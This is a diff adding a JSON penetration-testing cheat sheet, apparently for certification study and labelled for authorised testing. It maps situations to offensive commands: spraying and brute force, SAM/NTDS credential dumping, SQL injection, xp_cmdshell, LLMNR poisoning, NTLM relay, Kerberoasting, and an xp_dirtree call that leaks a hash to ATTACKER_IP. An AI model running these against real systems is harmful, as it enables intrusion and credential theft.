@@ -1,0 +1,211 @@
+{
+  "schemaVersion": 1,
+  "title": "Start here",
+  "intro": "Where to start when you are in front of a target and need the next command, not a tutorial. Pick your situation, open it, and jump straight to the moves and the tool that does the work. Search filters every play. This is a working reference for authorised testing only.",
+  "groups": [
+    {
+      "id": "open-service",
+      "name": "A port is open",
+      "blurb": "Straight off the scan: the first move on each service, then the route to access.",
+      "scenarios": [
+        {
+          "id": "s-smb",
+          "label": "SMB (445 / 139)",
+          "detail": "The richest target on a Windows network. Enumerate anonymously, then with a credential.",
+          "steps": [
+            { "text": "Null / guest session: shares, users, groups and the password policy in one pass.", "cmd": ["enum4linux-ng -A TARGET", "netexec smb TARGET -u '' -p '' --shares"], "link": "/cpts/#tool-smb-enum", "linkLabel": "SMB enumeration" },
+            { "text": "With a credential: spray, list shares, look for (Pwn3d!) and dump.", "cmd": ["netexec smb TARGET -u users.txt -p 'Welcome1' --continue-on-success", "netexec smb TARGET -u user -p pass --shares --sam"], "link": "/cpts/#tool-attacking-services", "linkLabel": "Attacking services" },
+            { "text": "Local admin? Execute, or relay unsigned SMB.", "cmd": ["impacket-psexec 'DOMAIN/user:pass@TARGET'"], "link": "/cpts/credential-access/", "linkLabel": "Credential access map" }
+          ]
+        },
+        {
+          "id": "s-http",
+          "label": "HTTP / HTTPS (80 / 443 / 8080)",
+          "detail": "Fingerprint the stack, discover content, then attack the app.",
+          "steps": [
+            { "text": "Identify the stack and find hidden content and vhosts.", "cmd": ["whatweb http://TARGET", "ffuf -u http://TARGET/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt"], "link": "/cpts/#tool-web-recon", "linkLabel": "Web recon" },
+            { "text": "Put a proxy in front so you can read and replay every request.", "cmd": ["# browser / tools -> 127.0.0.1:8080 (Burp)"], "link": "/cpts/#tool-web-proxies", "linkLabel": "Web proxies" },
+            { "text": "Test the inputs: SQLi, LFI, upload, command injection, SSTI.", "cmd": ["' OR 1=1-- -", "sqlmap -u 'http://TARGET/?id=1' --batch --dump"], "link": "/cpts/#tool-sql-injection", "linkLabel": "SQL injection" },
+            { "text": "Known off-the-shelf app (WordPress, Tomcat, Jenkins, GitLab)?", "cmd": ["searchsploit <app> <version>"], "link": "/cpts/#tool-common-apps", "linkLabel": "Attacking common applications" }
+          ]
+        },
+        {
+          "id": "s-ftp",
+          "label": "FTP (21)",
+          "detail": "Anonymous first, then a login, then what the login lets you do.",
+          "steps": [
+            { "text": "Try anonymous, list and pull files.", "cmd": ["ftp TARGET", "nmap -p21 --script ftp-anon TARGET"], "link": "/cpts/#tool-attacking-services", "linkLabel": "Attacking services" },
+            { "text": "Brute a real login with a short list; writable root under a web dir = webshell upload.", "cmd": ["hydra -L users.txt -P pass.txt ftp://TARGET"], "link": "/cpts/#tool-hydra", "linkLabel": "Hydra" }
+          ]
+        },
+        {
+          "id": "s-ssh",
+          "label": "SSH (22)",
+          "detail": "Keys and weak passwords are the way in.",
+          "steps": [
+            { "text": "Throttle to ~4 tasks and brute a known or likely user.", "cmd": ["hydra -L users.txt -P pass.txt -t 4 ssh://TARGET"], "link": "/cpts/#tool-hydra", "linkLabel": "Hydra" },
+            { "text": "Found an id_rsa? Crack it if encrypted, then log in.", "cmd": ["ssh2john id_rsa > ssh.hash", "john --wordlist=rockyou.txt ssh.hash"], "link": "/cpts/password-cracking/", "linkLabel": "Password attacks map" }
+          ]
+        },
+        {
+          "id": "s-rdp",
+          "label": "RDP (3389)",
+          "detail": "A full desktop with a credential or a hash.",
+          "steps": [
+            { "text": "Brute (keep -t low), or connect with a credential.", "cmd": ["hydra -L users.txt -p 'Welcome1' -t 4 rdp://TARGET", "xfreerdp /v:TARGET /u:user /p:pass"], "link": "/cpts/#tool-rdp-access", "linkLabel": "RDP access" },
+            { "text": "Only have the hash? Pass it (needs Restricted Admin).", "cmd": ["xfreerdp /v:TARGET /u:user /pth:NTHASH"], "link": "/cpts/credential-access/", "linkLabel": "Pass-the-Hash" }
+          ]
+        },
+        {
+          "id": "s-sql",
+          "label": "MSSQL (1433) / MySQL (3306)",
+          "detail": "A database login is often command execution.",
+          "steps": [
+            { "text": "Log in, enable and run xp_cmdshell on MSSQL.", "cmd": ["impacket-mssqlclient 'DOMAIN/user:pass@TARGET' -windows-auth", "enable_xp_cmdshell; xp_cmdshell 'whoami'"], "link": "/cpts/#tool-database-attacks", "linkLabel": "Database attacks" },
+            { "text": "Capture the service's NetNTLM hash with a UNC path, then crack/relay.", "cmd": ["EXEC xp_dirtree '\\\\ATTACKER_IP\\share';"], "link": "/cpts/#tool-attacking-services", "linkLabel": "Attacking services" }
+          ]
+        },
+        {
+          "id": "s-snmp",
+          "label": "SNMP (161/udp)",
+          "detail": "Community strings leak the whole config.",
+          "steps": [
+            { "text": "Guess the community string, then walk it for users, processes and secrets.", "cmd": ["onesixtyone -c community.txt TARGET", "snmpwalk -v2c -c public TARGET"], "link": "/cpts/#tool-snmp-enum", "linkLabel": "SNMP enumeration" }
+          ]
+        },
+        {
+          "id": "s-dns",
+          "label": "DNS (53)",
+          "detail": "A zone transfer hands you the namespace.",
+          "steps": [
+            { "text": "Try a zone transfer, then brute subdomains.", "cmd": ["dig axfr @TARGET DOMAIN", "dnsenum --dnsserver TARGET DOMAIN"], "link": "/cpts/#tool-service-enum", "linkLabel": "Service enumeration" }
+          ]
+        }
+      ]
+    },
+    {
+      "id": "foothold",
+      "name": "I have a shell",
+      "blurb": "First execution on a host. Stabilise, enumerate, escalate.",
+      "scenarios": [
+        {
+          "id": "s-shell-unstable",
+          "label": "The shell is unstable",
+          "detail": "No job control, dies on Ctrl-C.",
+          "steps": [
+            { "text": "Upgrade to a full PTY.", "cmd": ["python3 -c 'import pty; pty.spawn(\"/bin/bash\")'", "# Ctrl-Z; stty raw -echo; fg; export TERM=xterm"], "link": "/cpts/#tool-shell-upgrade", "linkLabel": "Shell upgrade" }
+          ]
+        },
+        {
+          "id": "s-win-shell",
+          "label": "A Windows shell",
+          "detail": "Enumerate the host and your token, then escalate to SYSTEM.",
+          "steps": [
+            { "text": "Who am I, what privileges, what is running.", "cmd": ["whoami /all", "systeminfo", "tasklist /svc"], "link": "/cpts/windows/", "linkLabel": "Windows quick ops map" },
+            { "text": "Run a scanner, then exploit the one finding (services, tokens, AlwaysInstallElevated).", "cmd": ["winPEASany.exe", "whoami /priv"], "link": "/cpts/#tool-windows-privesc", "linkLabel": "Windows privilege escalation" },
+            { "text": "Dump the local credential stores.", "cmd": ["reg save hklm\\sam sam.save & reg save hklm\\system system.save"], "link": "/cpts/password-cracking/", "linkLabel": "Dump & crack" }
+          ]
+        },
+        {
+          "id": "s-lin-shell",
+          "label": "A Linux shell",
+          "detail": "Enumerate, walk the privesc primitives, get to root.",
+          "steps": [
+            { "text": "Context and the quick wins.", "cmd": ["id; sudo -l", "find / -perm -4000 -type f 2>/dev/null", "getcap -r / 2>/dev/null"], "link": "/cpts/linux/", "linkLabel": "Linux quick ops map" },
+            { "text": "Run linPEAS, cross-check SUID/sudo on GTFOBins.", "cmd": ["./linpeas.sh"], "link": "/cpts/#tool-linux-privesc", "linkLabel": "Linux privilege escalation" },
+            { "text": "Hunt for credentials in configs, history and keys.", "cmd": ["grep -rniE 'password|secret' /var/www /etc /home 2>/dev/null"], "link": "/cpts/#tool-credential-hunting", "linkLabel": "Credential hunting" }
+          ]
+        }
+      ]
+    },
+    {
+      "id": "creds",
+      "name": "I have credentials or a hash",
+      "blurb": "Turn a secret into access, or into a password.",
+      "scenarios": [
+        {
+          "id": "s-password",
+          "label": "A plaintext password",
+          "detail": "Spray it, reuse it, log in with it.",
+          "steps": [
+            { "text": "Spray across the subnet for reuse, then get a shell.", "cmd": ["netexec smb 10.10.10.0/24 -u user -p 'Password1' --continue-on-success", "evil-winrm -i TARGET -u user -p 'Password1'"], "link": "/cpts/#tool-netexec", "linkLabel": "NetExec" }
+          ]
+        },
+        {
+          "id": "s-nthash",
+          "label": "An NTLM hash",
+          "detail": "Authenticate with the hash, no cracking needed.",
+          "steps": [
+            { "text": "Pass the hash over SMB / WinRM, or spray it.", "cmd": ["netexec smb TARGET -u user -H NTHASH --local-auth", "evil-winrm -i TARGET -u user -H NTHASH", "impacket-psexec user@TARGET -hashes :NTHASH"], "link": "/cpts/credential-access/", "linkLabel": "Pass-the-Hash" }
+          ]
+        },
+        {
+          "id": "s-ticket",
+          "label": "A Kerberos ticket or keytab",
+          "detail": "Reuse a ccache/keytab, or extract the hash from it.",
+          "steps": [
+            { "text": "Point tools at the ccache, or import a keytab.", "cmd": ["export KRB5CCNAME=/tmp/krb5cc_...", "kinit user@REALM -k -t user.keytab", "klist"], "link": "/cpts/credential-access/", "linkLabel": "Pass-the-Ticket" }
+          ]
+        },
+        {
+          "id": "s-hash",
+          "label": "A captured hash",
+          "detail": "Identify the type, then crack it.",
+          "steps": [
+            { "text": "Name the format, then wordlist + rules.", "cmd": ["hashid 'HASH'", "hashcat -m <mode> hashes.txt rockyou.txt -r best64.rule"], "link": "/cpts/password-cracking/", "linkLabel": "Password attacks map" }
+          ]
+        },
+        {
+          "id": "s-file",
+          "label": "A protected file (zip / kdbx / office)",
+          "detail": "Extract a crackable hash with a *2john tool.",
+          "steps": [
+            { "text": "Convert, then crack.", "cmd": ["keepass2john Database.kdbx > kp.hash", "john --wordlist=rockyou.txt kp.hash"], "link": "/cpts/#tool-hashcat", "linkLabel": "Hashcat / John" }
+          ]
+        }
+      ]
+    },
+    {
+      "id": "ad",
+      "name": "I'm attacking Active Directory",
+      "blurb": "The domain: from no creds to Domain Admin.",
+      "scenarios": [
+        {
+          "id": "s-ad-nocreds",
+          "label": "On the internal network, no credentials",
+          "detail": "Poison, relay and name the domain.",
+          "steps": [
+            { "text": "Poison LLMNR/NBT-NS to capture NetNTLMv2 hashes.", "cmd": ["sudo responder -I eth0"], "link": "/cpts/#tool-responder", "linkLabel": "Responder" },
+            { "text": "Relay that auth to an unsigned host instead of cracking.", "cmd": ["impacket-ntlmrelayx -tf targets.txt -smb2support"], "link": "/cpts/#tool-ntlm-relay", "linkLabel": "NTLM relay" },
+            { "text": "Find the domain and enumerate users for a spray.", "cmd": ["nmap -p88,389 --script krb5-enum-users,ldap-rootdse TARGET", "kerbrute userenum --dc TARGET -d domain.local users.txt"], "link": "/cpts/#tool-kerbrute", "linkLabel": "Kerbrute" }
+          ]
+        },
+        {
+          "id": "s-ad-creds",
+          "label": "I have a domain credential",
+          "detail": "Map the domain and find the path.",
+          "steps": [
+            { "text": "Collect BloodHound data and read the shortest path to DA.", "cmd": ["bloodhound-python -u user -p pass -d domain.local -c all -ns TARGET"], "link": "/cpts/#tool-bloodhound", "linkLabel": "BloodHound" },
+            { "text": "Roast: Kerberoast service accounts and AS-REP roast pre-auth-less users.", "cmd": ["impacket-GetUserSPNs -request 'domain.local/user:pass'", "impacket-GetNPUsers domain.local/ -usersfile users.txt"], "link": "/cpts/#tool-kerberos-attacks", "linkLabel": "Kerberos attacks" }
+          ]
+        },
+        {
+          "id": "s-ad-lateral",
+          "label": "I need to move to another host",
+          "detail": "Pass what you have: hash, key, ticket or certificate.",
+          "steps": [
+            { "text": "Pick the technique for what you hold.", "cmd": ["# hash -> Pass-the-Hash; key -> OverPass-the-Hash; cert -> PKINIT; ticket -> Pass-the-Ticket"], "link": "/cpts/credential-access/", "linkLabel": "Credential access & lateral movement" }
+          ]
+        },
+        {
+          "id": "s-ad-da",
+          "label": "I have Domain Admin",
+          "detail": "Dump everything and prove it.",
+          "steps": [
+            { "text": "DCSync or dump NTDS.dit for every domain hash.", "cmd": ["impacket-secretsdump 'domain.local/user:pass@DC' -just-dc-ntlm", "netexec smb DC -u user -p pass -M ntdsutil"], "link": "/cpts/password-cracking/", "linkLabel": "NTDS dump" }
+          ]
+        }
+      ]
+    }
+  ]
+}
